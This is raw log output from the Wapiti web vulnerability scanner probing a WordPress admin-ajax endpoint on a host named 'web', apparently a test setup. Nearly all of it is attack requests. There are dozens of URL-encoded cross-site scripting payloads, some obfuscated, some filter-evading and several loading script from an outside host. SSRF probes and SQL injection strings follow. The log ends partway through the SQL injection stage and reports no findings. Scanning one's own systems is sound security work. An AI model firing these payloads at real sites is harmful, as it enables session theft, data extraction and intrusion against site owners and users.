2024-03-21 21:11:29.516 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:30.486 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-21 21:11:30.486 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_29762aa1.db
2024-03-21 21:11:30.490 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
2024-03-21 21:11:30.519 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-21 21:11:30.519 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-21 21:11:30.594 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-21 21:11:30.623 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-21 21:11:30.624 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-21 21:11:30.636 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:31.467 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CScRiPt%3Ealert%28%27wyqgo11i6d%27%29%3C%2FsCrIpT%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:32.251 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CScRiPt%3Ealert%28%22wyqgo11i6d%22%29%3C%2FsCrIpT%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:33.032 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CScRiPt%3Ealert%28%2Fwyqgo11i6d%2F%29%3C%2FsCrIpT%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:33.812 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CSvG%2FoNloAd%3Dalert%28%2Fwyqgo11i6d%2F%29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:34.592 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CSvG%2FoNloAd%3Dalert%28%2Fwyqgo11i6d%2F%29%2F%2F&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:35.363 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CSvG%0AoNloAd%3Dalert%28%27wyqgo11i6d%27%29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:36.143 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CScript%20src%3Dhttps%3A%2F%2Fwc42a4.com%2Fwyqgo11i6dz.js%3E%3C%2FScript%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:36.925 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CScRiPt%20src%3D%2F%2Fwc42a4.com%2Fwyqgo11i6dz.js%3E%3C%2FScRiPt%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:37.705 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CScRiPt%3E%28alert%29%28%2Fwyqgo11i6d%2F%29%3B%3C%2FScRiPt%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:38.485 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CImG%20src%3Dz%20oNeRror%3Dalert%28%22wyqgo11i6d%22%29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:39.263 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CImG%20src%3Dz%20oNeRror%3Dalert%28%27wyqgo11i6d%27%29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:40.042 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CImG%20src%3Dz%20oNeRror%3Dalert%28%2Fwyqgo11i6d%2F%29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:40.822 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cobject%20data%3D%22javascript%3Aalert%28%27wyqgo11i6d%27%29%22%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:41.601 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cobject%20data%3D%22JaVasCript%3Aalert%28%27wyqgo11i6d%27%29%22%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:42.377 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cobject%20data%3D%27JaVasCript%3Aalert%28%22wyqgo11i6d%22%29%27%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:43.154 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CiFrAme%20src%3D%22jAvasCript%3Aalert%28%2Fwyqgo11i6d%2F%29%3B%22%3E%3C%2Fiframe%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:43.929 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cdetails%20open%20ontoggle%3Dconfirm%28%2Fwyqgo11i6d%2F%29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:44.707 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cbody%2FoNpagEshoW%3D%28confirm%29%28%2Fwyqgo11i6d%2F%29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:45.484 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Ca%0Aautofocus%0Aonfocus%3D%27%28function%28%29%7Breturn%20window%7D%29%28%29%5B%22alert%22%5D%28%22wyqgo11i6d%22%29%27%0Ahref%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:46.264 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cframe%20src%3D%22javascript%3Aalert%28%2Fwyqgo11i6d%2F%29%22%2F%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:47.043 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cmarquee%20loop%3D1%20width%3D0%20onfinish%3Dprompt%28%2Fwyqgo11i6d%2F%29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:47.818 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3E%3Csvg%3E%3Canimate%20onbegin%3Dprompt%28%2Fwyqgo11i6d%2F%29%20attributeName%3Du%20dur%3D1s%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:48.598 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CScRiPt%2Fsrc%3Dhttps%3A%2F%2Fwc42a4.com%2Fwyqgo11i6dz.js%3E%3C%2FsCrIpT%2F%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:49.376 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CScRiPt%09src%3Dhttps%3A%2F%2Fwc42a4.com%2Fwyqgo11i6dz.js%3E%3C%2FsCrIpT%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:50.153 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CImG%09src%3Dz%09oNeRror%3Dalert%28%2Fwyqgo11i6d%2F%29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:50.932 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E0%5BFF%5D%3CsCripT%5BFF%5D%3Ealert%28%2Fwyqgo11i6d%2F%29%3C%2FsCripT%5BFF%5D%3E%5BFF%5D0&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:52.025 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CScRiPt%09%3Ealert%28%2Fwyqgo11i6d%2F%29%3C%2FsCrIpT%09%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:52.806 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cobject%09data%3DjavAscripT%3Aalert%28%2Fwyqgo11i6d%2F%29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:53.582 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cscr%3Cscript%3Eipt%3E%28alert%29%28%2Fwyqgo11i6d%2F%29%2F%2F%3C%2Fscr%3C%2Fscript%3Eipt%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:54.361 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cscr%3Cscript%3Eipt%20src%3Dhttps%3A%2F%2Fwc42a4.com%2Fwyqgo11i6dz.js%3E%3C%2Fscript%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:55.135 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cscr%3Cscript%3Eipt%20src%3Dhttps%3A%2F%2Fwc42a4.com%2Fwyqgo11i6dz.js%3E%3C%2Fscr%3C%2Fscript%3Eipt%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:55.921 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cimg%20src%20onerror%3D%26emsp%3Bprompt%60%24%7B%2Fwyqgo11i6d%2F%7D%60%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:56.701 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CsCrIpt%3E%3C%21--%0Aconfirm%28%2Fwyqgo11i6d%2F%29%2F%2F--%3E%3C%2FsCrIpt%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:57.774 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3CScript%20e%3D%22%3E%22%20src%3D%22https%3A%2F%2Fwc42a4.com%2Fwyqgo11i6dz.js%22%3E%3C%2FScript%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:58.860 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cimg%20src%3Dk%20onerror%3Dprompt%60wyqgo11i6d%60%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:11:59.640 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Csvg%20onload%3D%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27wyqgo11i6d%26%23x27%26%23x29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:00.424 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cinput%20autofocus%20onfocus%20%3Dtop%5B%28584390752%2A16%29.toString%2832-1%2A2%29%5D%28%2Fwyqgo11i6d_%2F%29%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:01.192 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=y%22style%3D%22width%3A100%25%3Bheight%3A100%25%3Bposition%3Afixed%3Bleft%3A0px%3Btop%3A0px%3B%22onmouseover%3D%22alert%28%2Fwyqgo11i6d%2F%29&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:01.988 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=y%22style%3D%22width%3A100%25%3Bheight%3A100%25%3Bposition%3Afixed%3Bleft%3A0px%3Btop%3A0px%3B%22onpointerenter%3D%22confirm%60wyqgo11i6d%60%22zid%3D%22&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:02.741 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cscript%3E%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%29%28%29%3C%2Fscript%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:03.519 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Ccustom%0Achecked%0Aonpointerenter%3D%22x%3D%27pr%27%2Cy%3Dtop%3Bx%2B%3D%27ompt%27%3By%5Bx%5D%28%27wyqgo11i6d%27%29%22style%3D%22position%3Aabsolute%3Btop%3A0%3Bheight%3A2000px%3Bbackground-color%3Ared%3Bwidth%3A2000px%3Bleft%3A0%3Bz-index%3A9998%3B%22%3EXSS%3C%2Fcustom%0Atags%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:04.299 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%22%3E%3C%2Fdiv%3E%3Cdiv%20id%3D%22wyqgo11i6d%22%3Eyolo%3C%2Fdiv%3E&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:06.184 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-21 21:12:06.206 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:07.019 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-21 21:12:07.019 | GREEN    | wapitiCore.attack.mod_http_headers:check_header:103 - OK
2024-03-21 21:12:07.020 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-21 21:12:07.020 | GREEN    | wapitiCore.attack.mod_http_headers:check_header:103 - OK
2024-03-21 21:12:07.046 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-21 21:12:07.076 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-21 21:12:07.091 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:07.092 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F10yjkc%2F1%2F636f6c756d6e735f676170%2F&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:07.871 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F10yjkc%2F1%2F616374696f6e%2F (0)
2024-03-21 21:12:08.662 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=10yjkc for results, please wait...
2024-03-21 21:12:10.752 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-21 21:12:10.767 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:10.767 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%C2%BF%27%22%28&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:11.590 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=fuzz%C2%BF%27%22%28 (0)
2024-03-21 21:12:13.195 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%20AND%2071%3D159%20AND%2086%3D86&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:13.975 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%27%20AND%2075%3D153%20AND%20%2792%27%3D%2792&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:14.749 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%22%20AND%2093%3D184%20AND%20%2237%22%3D%2237&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:15.523 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%29%20AND%2039%3D94%20AND%20%2895%3D95&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:16.296 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%27%29%20AND%2077%3D142%20AND%20%28%2720%27%3D%2720&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:17.069 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%22%29%20AND%2094%3D129%20AND%20%28%2251%22%3D%2251&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:17.840 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%20AND%2068%3D142%20AND%2085%3D85 (0)
2024-03-21 21:12:18.603 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%20AND%2049%3D84%20AND%2064%3D64 (0)
2024-03-21 21:12:19.428 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%20AND%2063%3D63%20AND%2020%3D20 (0)
2024-03-21 21:12:20.248 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%27%20AND%2072%3D170%20AND%20%2769%27%3D%2769 (0)
2024-03-21 21:12:21.066 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%27%20AND%2034%3D89%20AND%20%2743%27%3D%2743 (0)
